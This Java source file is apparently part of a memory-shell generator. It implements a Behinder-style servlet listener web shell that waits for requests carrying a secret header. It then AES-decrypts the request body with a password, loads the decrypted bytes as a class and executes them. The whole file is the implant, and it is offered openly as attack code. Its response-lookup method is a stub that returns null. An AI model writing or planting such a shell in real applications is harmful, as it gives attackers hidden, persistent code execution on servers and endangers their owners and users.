package jmg.behinder.memshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class BehinderListener extends ClassLoader implements ServletRequestListener {
    public String pass;

    public String headerName;

    public String headerValue;


    public BehinderListener() {
    }

    public BehinderListener(ClassLoader c) {
        super(c);
    }


    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }


    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = this.getResponseFromRequest(request);
                HttpSession session = request.getSession();
                Map obj = new HashMap();
                obj.put("request", request);
                obj.put("response", response);
                obj.put("session", session);
                try {
                    session.putValue("u", pass);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                    (new BehinderListener(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(request.getReader().readLine()))).newInstance().equals(obj);
                } catch (Exception var7) {
                }
            }
        } catch (Exception e) {

        }

    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest var1) throws Exception {
        return null;
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }
}
